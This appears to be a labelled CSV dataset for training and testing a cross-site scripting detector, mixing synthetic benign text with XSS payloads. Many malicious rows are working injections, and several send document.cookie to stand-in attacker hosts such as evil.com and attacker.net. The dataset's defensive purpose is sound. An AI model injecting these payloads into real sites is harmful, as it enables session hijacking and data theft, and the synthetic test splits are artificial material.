+Feedback: Disappointing service and quick delivery.,0,feedback,benign,train
+best coffee maker 2020,0,search,benign,train
+x=document.cookie;alert(1);//27332,1,js_context_long,js_context_long,stress
+Maria_Clark31,0,name,benign,test
+');alert(document.cookie);//,1,js_context,js_context,train
+Nice work Amit! The part about football helped me a lot.,0,comment,benign,val
+"<video src=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",1,event_common,event_common,test
+SKU-8625-DX,0,product,benign,train
+<span ondblclick=alert(document.domain)>click,1,rare_handler,rare_handler,stress
+Meeting at 9pm on 22 Oct,0,price_date,benign,val
+Refund of $118.26 processed for order 28659.,0,order,benign,train
+"706 Park Avenue, Ghaziabad",0,address,benign,val
+"Support was excellent, resolved my issue in 15 minutes.",0,feedback,benign,train
+Feedback: Solid service and quick delivery.,0,feedback,benign,test
+"<a href=""javascript:document.location='http://attacker.net/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,val
+<script>prompt(1)</script>,1,script_tag,script_tag,test
+Refund of $83.43 processed for order 49343.,0,order,benign,train
+Nice work Fatima! The part about cooking helped me a lot.,0,comment,benign,val
+"360 Hill Crest, Noida",0,address,benign,test
+Reply to emma.mehta89@mail.example by Friday.,0,email,benign,train
+"Great article about databases, thanks for sharing!",0,comment,benign,train
+how to learn databases fast,0,search,benign,test
+Refund of $259.32 processed for order 30940.,0,order,benign,val
+Nice work Zara! The part about cricket helped me a lot.,0,comment,benign,test
+"<a href=""javascript:alert('XSS')"">click</a>",1,js_uri,js_uri,val
+This was excellent. Looking forward to more on gardening.,0,comment,benign,train
+backpack comparison,0,search,benign,val
+This was amazing. Looking forward to more on cricket.,0,comment,benign,val
+"House no. 381, Sector 50, Toronto",0,address,benign,train
+Priya Singh,0,name,benign,test
+Chen Brown,0,name,benign,val
+"{'status': 'success', 'id': 4051}",0,structured,benign_stress,stress
+"In JavaScript, an alert box shows a message; I never use alert in production.",0,code_talk,benign_stress,stress
+Reply to emma.garcia68@mail.example by Friday.,0,email,benign,train
+"Great article about cricket, thanks for sharing!",0,comment,benign,test
+"Age: 37, Location: Sydney",0,price_date,benign,train
+sofia.brown35@college.edu,0,email,benign,val
+"<body onload=""new Image().src='http://x.example/?c='+document.cookie"">",1,exfil_dom,exfil_dom,test
+Nice work Maria! The part about machine learning helped me a lot.,0,comment,benign,val
+"Age: 62, Location: Mumbai",0,price_date,benign,val
+<script>document.location='http://h4ck.me/?c='+document.cookie</script>,1,script_tag,script_tag,train
+I really liked this post on music.,0,comment,benign,train
+"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",1,mutation_xss,mutation_xss,stress
+Product ID: 743052,0,product,benign,val
+"Flat 39D, Lake View, Berlin 715519",0,address,benign,train
+Order #31044 confirmed.,0,order,benign,train
+"<img src=x onerror=""new Image().src='http://evil.com/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+"<iframe srcdoc=""<script>alert(origin)</script>""></iframe>",1,frame_object,frame_object,val
+if x < 2 and y > 8 then z = x + y,0,math,benign_stress,stress
+SKU-8326-BX,0,product,benign,test
+<button ondblclick=alert('XSS')>x,1,rare_handler,rare_handler,stress
+<iframe src=http://evil.com/p.html></iframe>,1,frame_object,frame_object,val
+Refund of $253.85 processed for order 97274.,0,order,benign,train
+"Headphones - amazing quality, ships in 1 days",0,product,benign,train
+javascript:confirm(1),1,js_uri,js_uri,train
+Please contact fatima.ali93@company.com for help.,0,email,benign,train
+<script>document.write('<img src=http://h4ck.me/?c='+document.cookie+'>')</script>,1,exfil_dom,exfil_dom,test
+"<script type=""text/javascript"">confirm(1)</script>",1,script_tag,script_tag,val
+<script>eval(atob('YWxlcnQoMSk='))</script>,1,script_tag,script_tag,train
+Nice work Kabir! The part about databases helped me a lot.,0,comment,benign,train
+<SCRIPT>alert(document.cookie)</SCRIPT>,1,script_tag,script_tag,test
+"""Emma said: 'it's amazing!'""",0,structured,benign_stress,stress
+Nice work David! The part about music helped me a lot.,0,comment,benign,test
+Rating 3/5 - reliable experience overall.,0,feedback,benign,val
+Price range: $112 - $240,0,price_date,benign,val
+"<img src=x onerror=""new Image().src='http://bad.site/?c='+document.cookie"">",1,exfil_dom,exfil_dom,test
+Omar Wang,0,name,benign,val
+"House no. 484, Sector 13, Ghaziabad",0,address,benign,test
+"Support was disappointing, resolved my issue in 20 minutes.",0,feedback,benign,train
+Meeting at 2pm on 6 Jun,0,price_date,benign,train
+useful notebook under 356 dollars,0,search,benign,val
+<i>Kabir</i> said the water bottle is disappointing.,0,html_formatting,benign_stress,stress
+"Headphones - disappointing quality, ships in 7 days",0,product,benign,val
+<details open onerror=alert('XSS')>,1,event_common,event_common,train
+/var/www/web_security/index.html,0,url_path,benign_stress,stress
+"<b>Decent</b> post, thanks Fatima!",0,html_formatting,benign_stress,stress
+f(x) = x^2 + 1x - 7; f(1) = ?,0,math,benign_stress,stress
+Please contact noah.sharma95@company.com for help.,0,email,benign,val
+Kabir_Khan58,0,name,benign,train
+"<input autofocus onmouseover=""console.log(1)"">",1,event_common,event_common,test
+<details open onmouseover=alert('XSS')>,1,event_common,event_common,train
+Sneha Smith-Ali,0,name,benign,test
+https://www.example.com/cooking?page=7&sort=asc,0,url_path,benign_stress,stress
+"""John said: 'it's disappointing!'""",0,structured,benign_stress,stress
+https://www.example.com/gardening?page=19&sort=asc,0,url_path,benign_stress,stress
+I honestly liked this post on cooking.,0,comment,benign,train
+"Support was solid, resolved my issue in 10 minutes.",0,feedback,benign,train
+Dr. Amit Khan,0,name,benign,train
+Sofia Brown,0,name,benign,val
+<body onload=alert(origin)><!-- 6614 -->,1,mixed_obfuscated,mixed_obfuscated,train
+I quite liked this post on python.,0,comment,benign,train
+javascript:alert('XSS'),1,js_uri,js_uri,train
+Product ID: 487728,0,product,benign,val
+Nice work Omar! The part about python helped me a lot.,0,comment,benign,train
+I used the script tag in my page and the photography demo worked.,0,code_talk,benign_stress,stress
+<body onload=alert(1)><!-- 27590 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"Headphones - amazing quality, ships in 3 days",0,product,benign,test
+%3cscript%3ealert(1)%3c%2fscript%3e,1,encoded,encoded,train
+"House no. 238, Sector 33, Berlin",0,address,benign,train
+`${alert(origin)}`,1,js_context,js_context,train
+Fatima_Sharma86,0,name,benign,val
+David_Garcia64,0,name,benign,train
+Price range: $125 - $781,0,price_date,benign,test
+zara.rao82@outlook.com,0,email,benign,train
+Dr. Sofia Sharma,0,name,benign,train
+I honestly liked this post on python.,0,comment,benign,val
+';alert(document.cookie)//,1,js_context,js_context,test
+"Great article about python, thanks for sharing!",0,comment,benign,val
+"%3cscript%3ealert(String.fromCharCode(88,83,83))%3c%2fscript%3e",1,encoded,encoded,train
+SKU-1176-DY,0,product,benign,train
+"';var a=new XMLHttpRequest();a.open('GET','http://attacker.net/'+document.domain);//",1,js_context_long,js_context_long,stress
+Price range: $33 - $253,0,price_date,benign,train
+Dr. David Mehta,0,name,benign,test
+"House no. 281, Sector 37, Ghaziabad",0,address,benign,val
+Category: Home & Garden,0,product,benign,train
+<svg onstart=prompt(1)>,1,event_common,event_common,train
+liam.gupta44@college.edu,0,email,benign,train
+x=document.cookie;alert(origin);//64843,1,js_context_long,js_context_long,stress
+This was solid. Looking forward to more on python.,0,comment,benign,train
+"';var a=new XMLHttpRequest();a.open('GET','http://evil.com/'+document.domain);//",1,js_context_long,js_context_long,stress
+Rating 3/5 - solid experience overall.,0,feedback,benign,train
+"{'status': 'success', 'id': 8288}",0,structured,benign_stress,stress
+This was solid. Looking forward to more on databases.,0,comment,benign,test
+best headphones 2022,0,search,benign,train
+Nice work Rahul! The part about python helped me a lot.,0,comment,benign,train
+<body onload=alert(document.cookie)><!-- 39937 -->,1,mixed_obfuscated,mixed_obfuscated,train
+<p onpageshow=alert(origin)>click,1,rare_handler,rare_handler,stress
+Meeting at 4am on 19 Jun,0,price_date,benign,test
+"<a href=""javascript:new Image().src='http://bad.site/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,test
+"<img src=x onerror=""fetch('http://evil.com/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,val
+');confirm(1);//,1,js_context,js_context,train
+Rating 3/5 - amazing experience overall.,0,feedback,benign,val
+Price range: $32 - $309,0,price_date,benign,val
+amazing phone case under 54 dollars,0,search,benign,train
+"House no. 96, Sector 21, Toronto",0,address,benign,test
+"Flat 11C, MG Road, Pune 868538",0,address,benign,test
+if x < 7 and y > 2 then z = x + y,0,math,benign_stress,stress
+Kabir_Verma33,0,name,benign,train
+';confirm(1)//,1,js_context,js_context,train
+"Support was decent, resolved my issue in 9 minutes.",0,feedback,benign,val
+"Flat 4A, Main Street, Toronto 117072",0,address,benign,train
+"<svg onmouseover=""alert('XSS')"">",1,event_common,event_common,train
+Nice work Omar! The part about databases helped me a lot.,0,comment,benign,train
+"Great article about photography, thanks for sharing!",0,comment,benign,train
+"<a href=""javascript:prompt(1)"">click</a>",1,js_uri,js_uri,train
+<script>document.write('<img src=http://bad.site/?c='+document.cookie+'>')</script>,1,exfil_dom,exfil_dom,test
+"Running Shoes - excellent quality, ships in 5 days",0,product,benign,test
+"Support was excellent, resolved my issue in 2 minutes.",0,feedback,benign,val
+%3Cscript%3Ealert(document.cookie)%3C/script%3E,1,encoded,encoded,train
+"<object data=""http://bad.site/x.swf""></object>",1,frame_object,frame_object,train
+"Great article about networking, thanks for sharing!",0,comment,benign,val
+"<input autofocus onstart=""confirm(1)"">",1,event_common,event_common,test
+I quite liked this post on databases.,0,comment,benign,train
+Can you write a follow-up on cooking? Thanks. I really liked this post on networking. I quite liked this post on travel. I quite liked this post on web security.,0,long_paragraph,benign_stress,stress
+Rating 5/5 - decent experience overall.,0,feedback,benign,train
+<svg/onstart=prompt(1)>,1,event_common,event_common,val
+My function onLoad handler is slow when loading 757 rows.,0,code_talk,benign_stress,stress
+Please contact john.sharma8@company.com for help.,0,email,benign,train
+');alert('XSS');//,1,js_context,js_context,val
+';alert(1)//,1,js_context,js_context,train
+\';alert('XSS')//,1,js_context,js_context,train
+"<form action=""javascript:alert('XSS')""><input type=submit>",1,js_uri,js_uri,train
+how to learn photography fast,0,search,benign,train
+"<img src=x onerror=""fetch('http://c2.example.org/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,train
+This was reliable. Looking forward to more on travel. Can you write a follow-up on football? Thanks. Nice work Fatima! The part about databases helped me a lot.,0,long_paragraph,benign_stress,stress
+I really liked this post on cricket.,0,comment,benign,train
+Rating 1/5 - great experience overall.,0,feedback,benign,test
+<SCRIPT>alert(1)</SCRIPT>,1,script_tag,script_tag,train
+Reply to meera.kumar48@mail.example by Friday.,0,email,benign,train
+I honestly liked this post on machine learning.,0,comment,benign,val
+Reply to priya.khan21@mail.example by Friday.,0,email,benign,train
+<script>new Image().src='http://bad.site/?c='+document.cookie</script>,1,script_tag,script_tag,val
+"628 Main Street, Austin",0,address,benign,test
+Amit_Brown86,0,name,benign,train
+https://www.example.com/networking?page=16&sort=asc,0,url_path,benign_stress,stress
+reliable laptop under 277 dollars,0,search,benign,train
+JaVaScRiPt:alert('XSS'),1,case_whitespace,case_whitespace,stress
+<body onload=console.log(1)><!-- 80632 -->,1,mixed_obfuscated,mixed_obfuscated,train
+javascript:prompt(1),1,js_uri,js_uri,val
+1;alert(1),1,js_context,js_context,val
+"Nice work Rahul! The part about machine learning helped me a lot. This was great. Looking forward to more on cooking. Great article about networking, thanks for sharing! Great article about databases, thanks for sharing! This was disappointing. Looking forward to more on football.",0,long_paragraph,benign_stress,stress
+I quite liked this post on travel.,0,comment,benign,train
+SKU-9534-AY,0,product,benign,train
+"Support was useful, resolved my issue in 5 minutes.",0,feedback,benign,train
+"Flat 10A, Lake View, Austin 108886",0,address,benign,val
+Meeting at 6pm on 13 Mar,0,price_date,benign,val
+best backpack 2021,0,search,benign,train
+Price range: $185 - $875,0,price_date,benign,train
+"Age: 64, Location: Noida",0,price_date,benign,test
+"<body onload=""new Image().src='http://h4ck.me/?c='+document.cookie"">",1,exfil_dom,exfil_dom,test
+"{'status': 'success', 'id': 671}",0,structured,benign_stress,stress
+Product ID: 902930,0,product,benign,train
+Nice work Amit! The part about gardening helped me a lot. Nice work Anita! The part about web security helped me a lot. This was disappointing. Looking forward to more on databases. Can you write a follow-up on cricket? Thanks. Can you write a follow-up on machine learning? Thanks.,0,long_paragraph,benign_stress,stress
+Meeting at 8pm on 9 Oct,0,price_date,benign,train
+SKU-3024-AX,0,product,benign,train
+Rating 2/5 - great experience overall.,0,feedback,benign,train
+<a href=# onmouseenter=alert(origin)>x,1,rare_handler,rare_handler,stress
+Please contact priya.mehta83@company.com for help.,0,email,benign,test
+"Support was average, resolved my issue in 18 minutes.",0,feedback,benign,train
+SKU-8889-FX,0,product,benign,train
+"Support was amazing, resolved my issue in 6 minutes.",0,feedback,benign,train
+<svg/onstart=alert('XSS')>,1,event_common,event_common,train
+"<input autofocus ontoggle=""alert(document.cookie)"">",1,event_common,event_common,val
+"Tip: avoid eval in your code, use JSON.parse for cricket data.",0,code_talk,benign_stress,stress
+how to learn python fast,0,search,benign,train
+"Support was useful, resolved my issue in 7 minutes.",0,feedback,benign,train
+<iframe src=http://attacker.net/p.html></iframe>,1,frame_object,frame_object,train
+how to learn machine learning fast,0,search,benign,train
+Price range: $65 - $513,0,price_date,benign,train
+sofia.brown95@college.edu,0,email,benign,test
+"Support was useful, resolved my issue in 25 minutes.",0,feedback,benign,val
+"Tip: avoid eval in your code, use JSON.parse for travel data.",0,code_talk,benign_stress,stress
+"Age: 18, Location: Ghaziabad",0,price_date,benign,train
+\';alert(origin)//,1,js_context,js_context,train
+"<math><mtext><table><mglyph><style><!--</style><img title=""--&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;"">",1,mutation_xss,mutation_xss,stress
+javascript:console.log(1),1,js_uri,js_uri,test
+"<img src=x onerror=""fetch('http://steal.io/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,val
+"<a href=""javascript:document.location='http://h4ck.me/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+Meeting at 5pm on 10 Oct,0,price_date,benign,test
+This was amazing. Looking forward to more on gardening.,0,comment,benign,test
+Reply to amit.wilson11@mail.example by Friday.,0,email,benign,train
+');alert(document.domain);//,1,js_context,js_context,train
+"Support was decent, resolved my issue in 24 minutes.",0,feedback,benign,train
+"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",1,frame_object,frame_object,test
+Nice work Neha! The part about machine learning helped me a lot.,0,comment,benign,train
+Emma_Khan94,0,name,benign,test
+Can you write a follow-up on machine learning? Thanks. Nice work Emma! The part about cooking helped me a lot. Can you write a follow-up on databases? Thanks. Can you write a follow-up on networking? Thanks.,0,long_paragraph,benign_stress,stress
+Price range: $18 - $322,0,price_date,benign,test
+"<body onload=""new Image().src='http://attacker.net/?c='+document.cookie"">",1,exfil_dom,exfil_dom,test
+Reply to fatima.mehta76@mail.example by Friday.,0,email,benign,train
+SKU-7719-DX,0,product,benign,train
+<body onload=prompt(1)><!-- 24464 -->,1,mixed_obfuscated,mixed_obfuscated,test
+desk lamp price,0,search,benign,train
+solid notebook under 217 dollars,0,search,benign,val
+I used the script tag in my page and the machine learning demo worked.,0,code_talk,benign_stress,stress
+"Age: 64, Location: Berlin",0,price_date,benign,train
+Please contact emma.brown29@company.com for help.,0,email,benign,train
+"<img
+src=x
+OnErRoR=alert(document.cookie)>",1,case_whitespace,case_whitespace,stress
+Product ID: 182289,0,product,benign,train
+javascript:alert(1),1,js_uri,js_uri,train
+<svg/onmouseover=alert(1)>,1,event_common,event_common,train
+Refund of $58.60 processed for order 67417.,0,order,benign,train
+Dr. Sneha Clark,0,name,benign,train
+"Nice work Liam! The part about web security helped me a lot. Can you write a follow-up on travel? Thanks. I quite liked this post on machine learning. Great article about photography, thanks for sharing! This was useful. Looking forward to more on travel.",0,long_paragraph,benign_stress,stress
+"Great article about music, thanks for sharing!",0,comment,benign,train
+"Support was reliable, resolved my issue in 24 minutes.",0,feedback,benign,train
+This was solid. Looking forward to more on cooking.,0,comment,benign,val
+"<iframe src=""data:text/html,<b>88717</b>""></iframe>",1,data_uri,data_uri,stress
+Reply to meera.wang80@mail.example by Friday.,0,email,benign,train
+"<body onerror=""alert('XSS')"">",1,event_common,event_common,train
+page=2&sort=desc&q=water+bottle,0,url_path,benign_stress,stress
+Nice work Arjun! The part about web security helped me a lot. I really liked this post on gardening. This was decent. Looking forward to more on python. I really liked this post on photography. Nice work Neha! The part about travel helped me a lot.,0,long_paragraph,benign_stress,stress
+<script>document.location='http://evil.com/?c='+document.cookie</script>,1,script_tag,script_tag,val
+"<meta http-equiv=""refresh"" content=""0;url=data:text/html,<script>alert(document.cookie)</script>"">",1,mutation_xss,mutation_xss,stress
+"Desk Lamp - solid quality, ships in 2 days",0,product,benign,train
+monitor deals,0,search,benign,test
+Nice work Maria! The part about photography helped me a lot.,0,comment,benign,val
+<script>fetch('http://steal.io/?c='+document.cookie)</script>,1,script_tag,script_tag,train
+<body onload=alert(origin)><!-- 90197 -->,1,mixed_obfuscated,mixed_obfuscated,val
+"Age: 31, Location: Ghaziabad",0,price_date,benign,val
+Neha Mehta-Reddy,0,name,benign,train
+Meeting at 3pm on 26 Jan,0,price_date,benign,test
+SKU-2111-EZ,0,product,benign,train
+Meeting at 9pm on 19 Oct,0,price_date,benign,train
+page=1&sort=desc&q=notebook,0,url_path,benign_stress,stress
+My function onLoad handler is slow when loading 887 rows.,0,code_talk,benign_stress,stress
+Your order of 1 x office chair was shipped on 24/7/2026.,0,order,benign,test
+"Support was disappointing, resolved my issue in 4 minutes.",0,feedback,benign,test
+Refund of $73.13 processed for order 23055.,0,order,benign,val
+"188 Park Avenue, Ghaziabad",0,address,benign,train
+Rating 2/5 - decent experience overall.,0,feedback,benign,train
+'-alert(origin)-',1,js_context,js_context,val
+"Can you write a follow-up on cooking? Thanks. I quite liked this post on photography. Great article about music, thanks for sharing! Nice work Neha! The part about networking helped me a lot. Can you write a follow-up on python? Thanks.",0,long_paragraph,benign_stress,stress
+"<form action=""javascript:alert(document.domain)""><input type=submit>",1,js_uri,js_uri,train
+1;alert(document.domain),1,js_context,js_context,train
+Meeting at 12am on 25 Oct,0,price_date,benign,train
+Solve: 4x + 15 = 65,0,math,benign_stress,stress
+This was excellent. Looking forward to more on databases.,0,comment,benign,train
+1;alert('XSS'),1,js_context,js_context,train
+Refund of $127.32 processed for order 90024.,0,order,benign,train
+Nice work Zara! The part about travel helped me a lot. This was amazing. Looking forward to more on travel. Nice work Neha! The part about web security helped me a lot.,0,long_paragraph,benign_stress,stress
+<script>document.location='http://steal.io/?c='+document.cookie</script>,1,script_tag,script_tag,train
+Price range: $186 - $578,0,price_date,benign,train
+Price range: $29 - $764,0,price_date,benign,val
+My function onLoad handler is slow when loading 450 rows.,0,code_talk,benign_stress,stress
+<script>new Image().src='http://steal.io/?c='+document.cookie</script>,1,script_tag,script_tag,val
+<script>fetch('http://x.example/?c='+document.cookie)</script>,1,script_tag,script_tag,train
+<body onload=alert(document.domain)><!-- 85623 -->,1,mixed_obfuscated,mixed_obfuscated,test
+Meeting at 2pm on 20 Mar,0,price_date,benign,train
+"<a href=""javascript:document.location='http://steal.io/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,train
+Reply to zara.rao59@mail.example by Friday.,0,email,benign,test
+"Support was excellent, resolved my issue in 18 minutes.",0,feedback,benign,train
+Rating 4/5 - disappointing experience overall.,0,feedback,benign,val
+Category: Electronics & Outdoors,0,product,benign,val
+"Flat 14B, Lake View, London 509711",0,address,benign,test
+"Great article about gardening, thanks for sharing!",0,comment,benign,val
+SKU-2477-BX,0,product,benign,val
+best monitor 2021,0,search,benign,train
+Sofia_Lopez84,0,name,benign,val
+"Tip: avoid eval in your code, use JSON.parse for photography data.",0,code_talk,benign_stress,stress
+"<a href=""javascript:new Image().src='http://x.example/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,val
+<img src=x onerror=alert(document.cookie)>,1,event_common,event_common,train
+<svg/onstart=alert(1)>,1,event_common,event_common,test
+Your order of 4 x office chair was shipped on 25/10/2026.,0,order,benign,train
+Can you write a follow-up on photography? Thanks.,0,comment,benign,train
+rahul.brown25@gmail.com,0,email,benign,train
+"<iframe src=""javascript:alert(1)""></iframe>",1,js_uri,js_uri,train
+<svg	onload	=	alert(1)>,1,case_whitespace,case_whitespace,stress
+"House no. 49, Sector 33, Ghaziabad",0,address,benign,train
+This was excellent. Looking forward to more on web security.,0,comment,benign,val
+"<iframe srcdoc=""<script>console.log(1)</script>""></iframe>",1,frame_object,frame_object,train
+Feedback: Reliable service and quick delivery.,0,feedback,benign,train
+<body onload=console.log(1)><!-- 4033 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"<input autofocus onload=""alert(String.fromCharCode(88,83,83))"">",1,event_common,event_common,train
+Meeting at 9am on 25 Mar,0,price_date,benign,test
+""";console.log(1)//",1,js_context,js_context,train
+Rating 4/5 - useful experience overall.,0,feedback,benign,train
+Neha Wilson-Gupta,0,name,benign,train
+Meeting at 5am on 19 Mar,0,price_date,benign,train
+Category: Sports & Outdoors,0,product,benign,val
+"Support was solid, resolved my issue in 16 minutes.",0,feedback,benign,val
+"Support was reliable, resolved my issue in 12 minutes.",0,feedback,benign,train
+<body onload=alert(document.domain)><!-- 17633 -->,1,mixed_obfuscated,mixed_obfuscated,val
+Rating 5/5 - average experience overall.,0,feedback,benign,train
+best water bottle 2024,0,search,benign,train
+/var/www/football/index.html,0,url_path,benign_stress,stress
+Please contact neha.rao27@company.com for help.,0,email,benign,train
+"<body onload=alert(String.fromCharCode(88,83,83))><!-- 74077 -->",1,mixed_obfuscated,mixed_obfuscated,test
+Refund of $256.50 processed for order 89058.,0,order,benign,train
+Meera Sharma-Taylor,0,name,benign,train
+headphones comparison,0,search,benign,train
+"<iframe src=""data:text/html,<b>91783</b>""></iframe>",1,data_uri,data_uri,stress
+Price range: $57 - $612,0,price_date,benign,train
+Order #79489 confirmed.,0,order,benign,train
+"<iframe src=""data:text/html,<b>81917</b>""></iframe>",1,data_uri,data_uri,stress
+This was useful. Looking forward to more on cricket.,0,comment,benign,train
+Please contact liam.wilson90@company.com for help.,0,email,benign,val
+<iframe src=http://bad.site/p.html></iframe>,1,frame_object,frame_object,train
+"<iframe src=""data:text/html,<b>40138</b>""></iframe>",1,data_uri,data_uri,stress
+"Support was solid, resolved my issue in 28 minutes.",0,feedback,benign,val
+SKU-1807-BY,0,product,benign,train
+I quite liked this post on music.,0,comment,benign,train
+office chair comparison,0,search,benign,train
+"307 Park Avenue, Ghaziabad",0,address,benign,train
+if x < 7 and y > 5 then z = x + y,0,math,benign_stress,stress
+"<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1,script_tag,script_tag,train
+"Support was average, resolved my issue in 17 minutes.",0,feedback,benign,val
+'-console.log(1)-',1,js_context,js_context,val
+x=document.cookie;confirm(1);//36103,1,js_context_long,js_context_long,stress
+"Support was solid, resolved my issue in 26 minutes.",0,feedback,benign,train
+Reply to maria.clark13@mail.example by Friday.,0,email,benign,val
+Chen_Clark46,0,name,benign,val
+"Age: 35, Location: Noida",0,price_date,benign,val
+"""-alert(origin)-""",1,js_context,js_context,train
+"House no. 72, Sector 16, Pune",0,address,benign,train
+best backpack 2022,0,search,benign,train
+<svg	onload	=	alert(document.domain)>,1,case_whitespace,case_whitespace,stress
+Why does fetch return a promise? Asking about music code.,0,code_talk,benign_stress,stress
+Product ID: 698717,0,product,benign,test
+"<b>Decent</b> post, thanks Arjun!",0,html_formatting,benign_stress,stress
+"Support was disappointing, resolved my issue in 29 minutes.",0,feedback,benign,train
+<svg><script>alert(1)</script></svg>,1,mixed_obfuscated,mixed_obfuscated,train
+Rating 1/5 - decent experience overall.,0,feedback,benign,train
+<video src=x onfocus=alert(document.domain)>,1,event_common,event_common,train
+<script>fetch('http://attacker.net/?c='+document.cookie)</script>,1,script_tag,script_tag,test
+"<a href=""javascript:alert(document.cookie)"">click</a>",1,js_uri,js_uri,train
+"';var a=new XMLHttpRequest();a.open('GET','http://x.example/'+document.domain);//",1,js_context_long,js_context_long,stress
+SKU-2875-AZ,0,product,benign,train
+"Great article about machine learning, thanks for sharing!",0,comment,benign,train
+office chair price,0,search,benign,test
+<svg onload=alert(document.domain)>,1,event_common,event_common,val
+"<img src=x onerror=""fetch('http://attacker.net/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,train
+best headphones 2023,0,search,benign,test
+keyboard comparison,0,search,benign,test
+SKU-7550-EX,0,product,benign,train
+Rahul_Ali58,0,name,benign,train
+"Age: 51, Location: Austin",0,price_date,benign,train
+"<script type=""text/javascript"">alert(1)</script>",1,script_tag,script_tag,test
+"<body onload=""eval(atob('YWxlcnQoMSk='))"">",1,exfil_dom,exfil_dom,train
+"<a href=""https://example.com/cricket"">read more</a>",0,html_formatting,benign_stress,stress
+"<math><mtext><table><mglyph><style><!--</style><img title=""--&gt;&lt;img src=1 onerror=alert(1)&gt;"">",1,mutation_xss,mutation_xss,stress
+I really liked this post on gardening.,0,comment,benign,train
+<ul><li>monitor</li><li>monitor</li></ul>,0,html_formatting,benign_stress,stress
+1 < 18 && 30 > 9,0,math,benign_stress,stress
+https://www.example.com/photography?page=15&sort=asc,0,url_path,benign_stress,stress
+\';alert(1)//,1,js_context,js_context,train
+Rating 5/5 - great experience overall.,0,feedback,benign,train
+<body onload=console.log(1)><!-- 15149 -->,1,mixed_obfuscated,mixed_obfuscated,val
+"<b>Excellent</b> post, thanks Kabir!",0,html_formatting,benign_stress,stress
+Neha_Reddy82,0,name,benign,train
+https://www.example.com/cricket?page=20&sort=asc,0,url_path,benign_stress,stress
+"<body onload=""fetch('http://steal.io/?c='+document.cookie)"">",1,exfil_dom,exfil_dom,test
+"';var a=new XMLHttpRequest();a.open('GET','http://c2.example.org/'+document.domain);//",1,js_context_long,js_context_long,stress
+meera.khan23@outlook.com,0,email,benign,train
+Order #36504 confirmed.,0,order,benign,train
+"Support was excellent, resolved my issue in 12 minutes.",0,feedback,benign,val
+<script >alert(document.cookie)</script >,1,script_tag,script_tag,train
+<input autofocus onfocus=alert('XSS')>,1,event_common,event_common,test
+"<body onload=""document.location='http://bad.site/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+<svg/ontoggle=alert('XSS')>,1,event_common,event_common,train
+SKU-2015-FY,0,product,benign,train
+Order #14833 confirmed.,0,order,benign,train
+"Nice work Anita! The part about photography helped me a lot. This was decent. Looking forward to more on python. Great article about cooking, thanks for sharing! Nice work Sneha! The part about gardening helped me a lot.",0,long_paragraph,benign_stress,stress
+SELECT name FROM users WHERE id = 143;,0,structured,benign_stress,stress
+Please contact arjun.gupta97@company.com for help.,0,email,benign,train
+Product ID: 823535,0,product,benign,train
+Refund of $78.11 processed for order 27950.,0,order,benign,train
+"<a href=""javascript:alert(1)"">click</a>",1,js_uri,js_uri,test
+<scr<script>ipt>alert(document.cookie)</scr</script>ipt>,1,mixed_obfuscated,mixed_obfuscated,train
+"This was great. Looking forward to more on web security. I quite liked this post on photography. This was amazing. Looking forward to more on web security. Can you write a follow-up on travel? Thanks. Great article about machine learning, thanks for sharing!",0,long_paragraph,benign_stress,stress
+Reply to maria.ali13@mail.example by Friday.,0,email,benign,train
+Arjun Mehta,0,name,benign,train
+"Support was excellent, resolved my issue in 3 minutes.",0,feedback,benign,test
+https://www.example.com/gardening?page=20&sort=asc,0,url_path,benign_stress,stress
+rahul.clark5@outlook.com,0,email,benign,train
+Arjun Singh-Rao,0,name,benign,train
+Order #72367 confirmed.,0,order,benign,train
+"<embed src=""data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"">",1,data_uri,data_uri,stress
+Refund of $274.78 processed for order 82235.,0,order,benign,train
+solid coffee maker under 409 dollars,0,search,benign,val
+"House no. 40, Sector 32, Toronto",0,address,benign,val
+Your order of 4 x office chair was shipped on 16/5/2026.,0,order,benign,train
+Price range: $171 - $869,0,price_date,benign,val
+Please contact fatima.khan93@company.com for help.,0,email,benign,test
+Reply to liam.wilson23@mail.example by Friday.,0,email,benign,val
+Nice work Rahul! The part about networking helped me a lot.,0,comment,benign,train
+"<body onload=""document.location='http://x.example/?c='+document.cookie"">",1,exfil_dom,exfil_dom,train
+<i>David</i> said the desk lamp is average.,0,html_formatting,benign_stress,stress
+kabir.rao16@outlook.com,0,email,benign,val
+Please contact anita.reddy44@company.com for help.,0,email,benign,train
+<script>fetch('http://h4ck.me/?c='+document.cookie)</script>,1,script_tag,script_tag,train
+x=document.cookie;confirm(1);//80760,1,js_context_long,js_context_long,stress
+Nice work Liam! The part about cricket helped me a lot.,0,comment,benign,train
+<ul><li>water bottle</li><li>monitor</li></ul>,0,html_formatting,benign_stress,stress
+"<a href=""javascript:new Image().src='http://attacker.net/?c='+document.cookie"">Claim Prize</a>",1,exfil_dom,exfil_dom,test
+"730 Lake View, Berlin",0,address,benign,train
+"<iframe src=""data:text/html,<b>67379</b>""></iframe>",1,data_uri,data_uri,stress
+<body onload=alert(document.domain)><!-- 69038 -->,1,mixed_obfuscated,mixed_obfuscated,train
+"Water Bottle - great quality, ships in 5 days",0,product,benign,val
+<ul><li>keyboard</li><li>headphones</li></ul>,0,html_formatting,benign_stress,stress
+if x < 7 and y > 7 then z = x + y,0,math,benign_stress,stress
+Please contact chen.khan38@company.com for help.,0,email,benign,train
+<body onload=console.log(1)><!-- 43684 -->,1,mixed_obfuscated,mixed_obfuscated,test
+"Flat 23C, MG Road, Mumbai 961574",0,address,benign,val
+&#x3C;img src=x onerror=alert(document.cookie)&#x3E;,1,encoded,encoded,test
